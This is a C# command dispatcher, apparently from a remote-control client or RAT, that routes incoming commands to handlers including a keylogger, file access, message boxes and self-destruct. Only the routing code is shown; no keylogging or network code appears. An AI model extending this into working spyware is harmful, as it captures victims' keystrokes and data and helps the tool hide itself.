using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
namespace Client.Commands
{
    public class CommandHandler
    {

        List<Command> commands;
        public CommandHandler() 
        {
            this.commands = new List<Command>();
            this.commands.Add(new Beep("beep"));
            this.commands.Add(new GetName("name"));
            this.commands.Add(new File("file"));
            this.commands.Add(new MsgBox("msgbox"));
            this.commands.Add(new keyLogger("keylogger"));
            this.commands.Add(new SelfDestruct("destroy"));
        }

        public string runCommand( string cmd)
        {
            string[] sp = cmd.Split(' ');
            string name = sp.First();
            string[] args = sp.Skip(1).ToArray();


            foreach (Command c in this.commands)
            {
                if (c.name.ToLower() == name)
                {
                   return c.execute(args);
                    
                }
            }
            return "Command "+ cmd + " Doesn't Exist for know  ;)";
        }
    }
}
